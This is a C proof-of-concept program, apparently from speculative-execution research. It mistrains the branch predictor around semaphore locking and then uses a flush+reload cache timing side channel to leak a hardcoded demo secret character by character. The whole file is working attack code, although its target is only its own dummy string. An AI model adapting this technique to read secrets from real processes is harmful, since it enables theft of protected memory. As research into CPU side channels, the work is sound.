#include <stdio.h>
#include <time.h>
#include <pthread.h>
#include <semaphore.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT   100
#define N_PAGES     256

#define REPETITIONS 100
#define N_TRAINING  10
#define SECRET_SIZE 9
#define SECRET      "mysecret"
#define SEM_COUNT   1

#define false       0
#define true        1
#define DBG         0

#define FLAG PTHREAD_MUTEX_DEFAULT
//#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP

cp_t* flush_reload_arr;

void attack_func(sem_t* sem_ptr,
                 int* sem_val_ptr, int secret_index) {
    if(sem_trywait(sem_ptr) != 0) return;
    *sem_val_ptr = secret_index;
    sem_post(sem_ptr);
    volatile cp_t cp;
    cp = flush_reload_arr[SECRET[*sem_val_ptr]];
}

/*
 * Variables required in cache:
 *  sem0_var
 *  secret_index
 * Variables required in mem:
 *  sem0
 *
 * Training: sem_index=1   secret_index=0
 * Attack:   sem_index=0   secret_index={iterate through SECRET}
 */
void victim_func(int sem_index, int secret_index) {
    //creates 2 semaphores. put addresses in array to prevent branches (fools branch predictor).
    sem_t sem0, sem1;
    sem_init(&sem0, 0, SEM_COUNT);
    sem_init(&sem1, 0, SEM_COUNT);
    int n_sems = 2;
    sem_t* sem01_addresses[n_sems];
    sem01_addresses[0] = &sem0;
    sem01_addresses[1] = &sem1;
    int  sem0_var, sem1_var;
    int* sem0or1var_addresses[n_sems];
    sem0or1var_addresses[0] = &sem0_var;
    sem0or1var_addresses[1] = &sem1_var;

    //lock either sem0 or sem1, depending on the parameter.
    //Branch predictor cannot determine which (no branches).
    //Set value of respective sem0_var or sem1_var to 0.
    sem_t* sem0or1_address;
    sem0or1_address = sem01_addresses[sem_index];
    sem_wait(sem0or1_address);
    *sem0or1var_addresses[sem_index] = 0;

    //Remove sem0 from cache, so that the branch will speculatively execute.
    cpuid();
    flush(&sem0);
    cpuid();
    attack_func(&sem0, &sem0_var, secret_index);

    cpuid();
    sem_post(sem0or1_address);
    sem_destroy(&sem0);
    sem_destroy(&sem1);
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int  n_accesses =   N_TRAINING + 1;
    char sem_indices   [n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0;  i < n_accesses; i++) {
        sem_indices   [i] = 1;
        secret_indices[i] = 0;
    }
    sem_indices   [n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        victim_func(sem_indices[i], secret_indices[i]);
        cpuid();
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
    free_flush_reload(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);
}